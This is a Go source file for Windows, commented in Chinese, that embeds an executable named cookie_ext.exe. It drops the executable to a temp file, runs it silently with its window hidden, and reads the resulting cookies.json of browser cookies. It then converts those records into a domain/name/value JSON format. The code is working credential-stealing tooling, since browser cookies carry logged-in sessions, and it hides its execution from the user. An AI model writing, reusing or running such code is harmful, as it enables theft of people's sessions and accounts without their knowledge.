//go:build windows

package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"syscall"

	_ "embed" // Required for go:embed
)

// 内嵌 cookie_ext.exe
//
//go:embed cookie_ext.exe
var cookieExtractor []byte

type InputCookie struct {
	HostKey string `json:"host_key"`
	Name    string `json:"name"`
	Value   string `json:"value"`
}

type TransformedCookie struct {
	Domain string `json:"domain"`
	Name   string `json:"name"`
	Value  string `json:"value"`
}

// OutJson 释放并执行内嵌的 cookie_ext.exe 来获取 cookies.json
func OutJson() {
	// 1. 创建一个带 .exe 后缀的临时文件
	tmpFile, err := ioutil.TempFile("", "cookie_ext_*.exe")
	if err != nil {
		log.Printf("为 cookie 提取器创建临时文件失败: %v", err)
		return
	}
	defer os.Remove(tmpFile.Name()) // 确保执行后删除临时文件

	// 2. 将内嵌的 exe 数据写入临时文件
	if _, err := tmpFile.Write(cookieExtractor); err != nil {
		log.Printf("写入 cookie 提取器到临时文件失败: %v", err)
		return
	}
	// 必须关闭文件句柄，否则系统无法执行
	if err := tmpFile.Close(); err != nil {
		log.Printf("关闭临时文件句柄失败: %v", err)
		return
	}

	// 3. 静默执行提取器
	log.Println("正在静默执行内嵌的 cookie 提取器...")
	cmd := exec.Command(tmpFile.Name())
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000, // CREATE_NO_WINDOW
	}

	// 运行并等待其完成，捕获输出以便调试
	output, err := cmd.CombinedOutput()
	if err != nil {
		log.Printf("Cookie 提取器执行失败: %v", err)
		log.Printf("提取器输出:\n%s", string(output))
		return
	}

	// 4. 检查结果
	if _, err := os.Stat("cookies.json"); err == nil {
		log.Println("Cookie 提取器运行成功, 'cookies.json' 已创建。")
	} else {
		log.Println("Cookie 提取器已运行, 但未找到 'cookies.json' 文件。")
		log.Printf("提取器输出:\n%s", string(output))
	}
}

// ConvertCookiesJSON 读取并转换 cookies.json 文件
func ConvertCookiesJSON() ([]byte, error) {
	fileBytes, err := os.ReadFile("cookies.json")
	if err != nil {
		return nil, fmt.Errorf("读取 cookies.json 文件失败: %w", err)
	}

	var cookies []InputCookie
	if err := json.Unmarshal(fileBytes, &cookies); err != nil {
		return nil, fmt.Errorf("解析 cookies.json 失败: %w", err)
	}

	transformedCookies := make([]TransformedCookie, len(cookies))
	for i, cookie := range cookies {
		transformedCookies[i] = TransformedCookie{
			Domain: cookie.HostKey,
			Name:   cookie.Name,
			Value:  cookie.Value,
		}
	}

	outputBytes, err := json.Marshal(transformedCookies)
	if err != nil {
		return nil, fmt.Errorf("编码转换后的 cookie 数据失败: %w", err)
	}

	return outputBytes, nil
}
